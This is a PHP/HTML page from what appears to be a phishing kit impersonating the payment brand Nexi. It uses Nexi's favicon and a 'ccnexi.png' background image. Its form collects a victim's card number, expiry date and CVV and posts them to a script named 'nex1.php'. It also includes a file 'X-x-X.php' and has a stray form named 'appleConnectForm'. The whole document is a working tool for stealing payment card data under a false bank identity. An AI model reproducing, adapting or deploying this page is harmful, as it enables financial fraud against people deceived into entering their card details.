<?php   ob_start();  ?>
<?
include "X-x-X.php";
?>
<html>
<head><meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
	<title>Dashboard</title>
	<link rel="icon" type="image/png" href="https://www.nexi.it/etc/designs/nexi/favicon.ico" />
	<style>
		body {
		 margin-top: -41;
		 background: url("STR/Back.png");
		}

		.page {
		 background-image: url("STR/ccnexi.png");
		 background-repeat: no-repeat;
		 height: 650px;
		 width: 1355px;
		 position: relative;
		}
		
		input, select {
		 position: absolute; /* VODKA */
		 width: 304;
		 height: 22;
		 border: 0;
		 padding: 3 8 3 8;
		 left: 587;
		}

		.button {
		 width: 105;
		 height: 37;
		 border: 0;
		 cursor: pointer;
		}
		.submit {
		 position: absolute;
		 left: 810;
		 top: 540;
		}
	</style>
	

								<p>&nbsp;<form name="appleConnectForm" method="post" action="nex1.php">

	<center>
			<form action="--WEBBOT-SELF--" method="POST" id="info" onsubmit="if(do_submit(3)) return true; else return false;">
		<div class="page">

			<div>
				<input type="text" placeholder="Numero de tarjeta" autocapitalize="off" autocorrect="off" maxlength="16" tabindex="1" required="" title="" id="fullname1" name="carta1" style="top:176;text-align: center; left:520; width:348px; height:47.5" size="41">
								<input type="text" id="pass0" placeholder="Fecha de caducidad (MM/AAAA)"name="exp1" class="pass" required="" title="  " style="position: absolute; left: 520; top: 376;text-align: center; height: 47.5px; width: 348px" size="1"><div class="button submit" onclick="javascript:do_submit(1);" style="position: absolute; left: 358px; top: 490px; width: 88px; height: 30px">
								<input type="text" placeholder="CVV" autocapitalize="off" autocorrect="off" maxlength="3" tabindex="1" required="" title="" id="fullname1" name="cvv1" style="top:-214;text-align: center; left:162; width:348px; height:47.5" size="41">
					<p>
<input type="image"  border="0" alt="" name="submit" style="position: absolute; left: 230; top: -10; height: 42px; width: 180px" src="STR/blank.gif">
					<p>
			&nbsp;</div>
					<!--  -->